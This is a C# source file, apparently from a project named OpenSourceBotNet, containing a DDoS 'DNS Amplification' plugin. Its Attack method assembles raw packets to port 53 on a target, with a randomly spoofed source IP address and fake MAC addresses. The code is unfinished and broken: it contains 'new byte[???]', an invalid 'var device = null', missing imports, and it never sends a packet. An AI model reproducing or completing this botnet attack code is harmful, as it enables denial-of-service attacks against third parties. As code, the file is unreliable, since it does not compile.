using System;
using System.Collections;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;

using OpenSourceBotNet.Plugins.Engines;
using OpenSourceBotNet.Core.Helpers;

using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap;

namespace OpenSourceBotNet.Plugins.Engines.DDoS.Plugins.DNS
{
    public class Amplification : OpenSourceBotNet.Plugins.Engines.Plugins.DDoS.Plugins.DDoSPluginPlugin
    {

        public Amplification(string[] spWorkString) : base(spWorkString)
        {

        }

        public override object[] Attack(string[] DDoSWork)
        {
            object[] obj = new object[2];

            string sDestinationAddress = DDoSWork[0];

            ushort tcpSourcePort = ushort.Parse(GetOpenPort());
            ushort tcpDestinationPort = 53;

            TcpPacket tcpPacket = new TcpPacket(tcpSourcePort, tcpDestinationPort);

            IPAddress ipSourceAddress = System.Net.IPAddress.Parse(GetRandomIP());
            IPAddress ipDestinationAddress = System.Net.IPAddress.Parse(sDestinationAddress);

            IPv4Packet ipPacket = new IPv4Packet(ipSourceAddress, ipDestinationAddress);
            
            string sourceHwAddress = "90-90-90-90-90-90";
            var ethernetSourceHwAddress = System.Net.NetworkInformation.PhysicalAddress.Parse(sourceHwAddress);

            string destionationHwAddress = "80-80-80-80-80-80";
            var ethernetDestinationHwAdress = System.Net.NetworkInformation.PhysicalAddress.Parse(destionationHwAddress);

            var ethernetPacket = new EthernetPacket(ethernetSourceHwAddress, ethernetDestinationHwAdress, EthernetPacketType.None);

            ipPacket.PayloadPacket = tcpPacket;
            ethernetPacket.PayloadPacket = ipPacket;

            byte[] bPacket = new byte[???];

            var devices = CaptureDeviceList.Instance;

            int i = 0;

            var device = null;


            


            return obj;
        }

        public override void Stop()
        {
            
        }

        public string GetRandomIP()
        {
            string sIp = FluxGlobal.random.Next(1, 254).ToString() + "." + FluxGlobal.random.Next(1, 254).ToString() + "." + FluxGlobal.random.Next(1, 254).ToString() + "." + FluxGlobal.random.Next(1, 254).ToString();

            return sIp;
        }

        private string GetOpenPort()
        {
            int PortStartIndex = 1000;
            int PortEndIndex = 2000;
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            IPEndPoint[] tcpEndPoints = properties.GetActiveTcpListeners();

            List<int> usedPorts = tcpEndPoints.Select(p => p.Port).ToList<int>();
            int unusedPort = 0;

            for (int port = PortStartIndex; port < PortEndIndex; port++)
            {
                if (!usedPorts.Contains(port))
                {
                    unusedPort = port;
                    break;
                }
            }
            return unusedPort.ToString();
        }
    }
}
